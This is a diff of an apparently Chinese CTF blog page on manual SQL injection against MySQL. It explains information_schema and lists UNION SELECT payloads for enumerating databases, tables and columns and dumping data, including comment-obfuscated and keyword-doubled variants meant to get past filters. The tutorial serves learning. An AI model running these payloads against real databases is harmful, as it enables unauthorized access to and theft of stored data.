@@ -6,20 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>手动注入 | qwerty-a&#39;s blog</title>
+  <title>基础sql手动注入 | qwerty-a&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1.测试是否可以注入，可以用布尔监测。几个常用的函数：user()返回当前数据库连接使用的用户；database()返回当前数据库连接使用的数据库；version()返回当前数据库的版本；union 连接两个语句">
+  <meta name="description" content="首先了解数据库一些基本语句几个常用的函数：user()返回当前数据库连接使用的用户；database()返回当前数据库连接使用的数据库；version()返回当前数据库的版本；union 连接两个语句">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="手动注入">
+<meta property="og:title" content="基础sql手动注入">
 <meta property="og:url" content="http://yoursite.com/2018/12/12/手动注入/index.html">
 <meta property="og:site_name" content="qwerty-a&#39;s blog">
-<meta property="og:description" content="1.测试是否可以注入，可以用布尔监测。几个常用的函数：user()返回当前数据库连接使用的用户；database()返回当前数据库连接使用的数据库；version()返回当前数据库的版本；union 连接两个语句">
+<meta property="og:description" content="首先了解数据库一些基本语句几个常用的函数：user()返回当前数据库连接使用的用户；database()返回当前数据库连接使用的数据库；version()返回当前数据库的版本；union 连接两个语句">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-18T13:55:51.583Z">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006XekMIgy1fyb9hym0pjj30pf0gc78m.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006XekMIgy1fyb9jxmkcgj30sc08qjv6.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006XekMIgy1fyb9yxowg1j305i03saaq.jpg">
+<meta property="og:updated_time" content="2018-12-18T14:38:25.697Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="手动注入">
-<meta name="twitter:description" content="1.测试是否可以注入，可以用布尔监测。几个常用的函数：user()返回当前数据库连接使用的用户；database()返回当前数据库连接使用的数据库；version()返回当前数据库的版本；union 连接两个语句">
+<meta name="twitter:title" content="基础sql手动注入">
+<meta name="twitter:description" content="首先了解数据库一些基本语句几个常用的函数：user()返回当前数据库连接使用的用户；database()返回当前数据库连接使用的数据库；version()返回当前数据库的版本；union 连接两个语句">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006XekMIgy1fyb9hym0pjj30pf0gc78m.jpg">
   
     <link rel="alternative" href="/atom.xml" title="qwerty-a&#39;s blog" type="application/atom+xml">
   
@@ -166,7 +170,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      手动注入
+      基础sql手动注入
     </h1>
   
 
@@ -179,9 +183,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-测试是否可以注入，可以用布尔监测。"><a href="#1-测试是否可以注入，可以用布尔监测。" class="headerlink" title="1.测试是否可以注入，可以用布尔监测。"></a>1.测试是否可以注入，可以用布尔监测。</h2><p>几个常用的函数：<br>user()返回当前数据库连接使用的用户；<br>database()返回当前数据库连接使用的数据库；<br>version()返回当前数据库的版本；<br>union 连接两个语句<br><a id="more"></a><br>一些表说明：<br>information_schema：MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等<br>TABLES表：给出了关于数据库中的表的信息。<br>COLUMNS表：给出了表中的列信息。<br>table_name：表的名字<br>column_name：列的名字</p>
-<p>1’ union/<strong>/select/</strong>table_name/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/‘1’=’1<br>1’ union/<strong>/select/</strong>/column_name/<strong>/information_schema.columnsa.columns/</strong>/where/<strong>/table_name=’flag<br>1’ union/</strong>/select/<strong>/column_namcolumn_namee/</strong>/from/<strong>/information_scheminformation_schema.columnsa.columns/</strong>/where/<strong>/table_name=’flag<br>1’ union/</strong>/select/<strong>/column_name/</strong>/from/<strong>/information_schema.columns/</strong>/where/**/table_name=’flag<br>concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而在concat_ws函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例：<br>concat_ws(char(32,58,32),user(),database(),version())其中char()函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:)，通过这样的方式可以绕过一些简单的过滤机制。</p>
-<h2 id="2-用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息"><a href="#2-用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息" class="headerlink" title="2.用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息"></a>2.用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息</h2><h2 id="3-查询所有的表名"><a href="#3-查询所有的表名" class="headerlink" title="3.查询所有的表名"></a>3.查询所有的表名</h2><h2 id="4-直接对其进行进一步的查询，查看其所有的列名"><a href="#4-直接对其进行进一步的查询，查看其所有的列名" class="headerlink" title="4.直接对其进行进一步的查询，查看其所有的列名"></a>4.直接对其进行进一步的查询，查看其所有的列名</h2><h2 id="5-直接查询数据"><a href="#5-直接查询数据" class="headerlink" title="5.直接查询数据"></a>5.直接查询数据</h2><p>hh</p>
+        <p>首先了解数据库一些基本语句<br>几个常用的函数：<br>user()返回当前数据库连接使用的用户；<br>database()返回当前数据库连接使用的数据库；<br>version()返回当前数据库的版本；<br>union 连接两个语句<br><a id="more"></a><br>一些表说明：<br>information_schema：MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等<br>information_schema.tables 数据库中的所有表<br>information_schema.columns 数据库中所有的表<br>table_name：所有表的名字<br>column_name：所有列列的名字<br>table_schema：提供了当前mysql实例中所有数据库的信息<br>tables表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<br>columns表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p>
+<p><img src="https://ws1.sinaimg.cn/large/006XekMIgy1fyb9hym0pjj30pf0gc78m.jpg" alt=""></p>
+<p><img src="https://ws1.sinaimg.cn/large/006XekMIgy1fyb9jxmkcgj30sc08qjv6.jpg" alt=""></p>
+<h2 id="下面是一般操作"><a href="#下面是一般操作" class="headerlink" title="下面是一般操作"></a>下面是一般操作</h2><h3 id="1-首先查询当前使用的数据库名字，也就是database-。"><a href="#1-首先查询当前使用的数据库名字，也就是database-。" class="headerlink" title="1.首先查询当前使用的数据库名字，也就是database()。"></a>1.首先查询当前使用的数据库名字，也就是database()。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select database()</span><br></pre></td></tr></table></figure>
+<h3 id="2-查询当前数据库里面的表。"><a href="#2-查询当前数据库里面的表。" class="headerlink" title="2.查询当前数据库里面的表。"></a>2.查询当前数据库里面的表。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select table_name from information_schema.tables where table_schema=&apos;之前查到的database（）&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="3-查询某个表的列信息。"><a href="#3-查询某个表的列信息。" class="headerlink" title="3.查询某个表的列信息。"></a>3.查询某个表的列信息。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select column_name,2 from information_schema.columns where table_name=&apos;你想查看的表的名字&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="4-查出某个表的列里面保存的信息。"><a href="#4-查出某个表的列里面保存的信息。" class="headerlink" title="4.查出某个表的列里面保存的信息。"></a>4.查出某个表的列里面保存的信息。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 列名 from 表名</span><br></pre></td></tr></table></figure>
+<p>当然这是最基础的，正常情况下会对一些查询语句进行屏蔽，这个时候就要想办法绕过这些屏蔽，至于怎么绕过，后面和xss一起总结。</p>
+<p><img src="https://ws1.sinaimg.cn/large/006XekMIgy1fyb9yxowg1j305i03saaq.jpg" alt=""></p>
 
       
 
@@ -334,7 +344,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-测试是否可以注入，可以用布尔监测。"><span class="toc-number">1.</span> <span class="toc-text">1.测试是否可以注入，可以用布尔监测。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息"><span class="toc-number">2.</span> <span class="toc-text">2.用union语句接上select语句使用前面提过的函数组合即可查询到用户、数据库及其版本等信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-查询所有的表名"><span class="toc-number">3.</span> <span class="toc-text">3.查询所有的表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-直接对其进行进一步的查询，查看其所有的列名"><span class="toc-number">4.</span> <span class="toc-text">4.直接对其进行进一步的查询，查看其所有的列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-直接查询数据"><span class="toc-number">5.</span> <span class="toc-text">5.直接查询数据</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#下面是一般操作"><span class="toc-number">1.</span> <span class="toc-text">下面是一般操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-首先查询当前使用的数据库名字，也就是database-。"><span class="toc-number">1.1.</span> <span class="toc-text">1.首先查询当前使用的数据库名字，也就是database()。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-查询当前数据库里面的表。"><span class="toc-number">1.2.</span> <span class="toc-text">2.查询当前数据库里面的表。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-查询某个表的列信息。"><span class="toc-number">1.3.</span> <span class="toc-text">3.查询某个表的列信息。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-查出某个表的列里面保存的信息。"><span class="toc-number">1.4.</span> <span class="toc-text">4.查出某个表的列里面保存的信息。</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
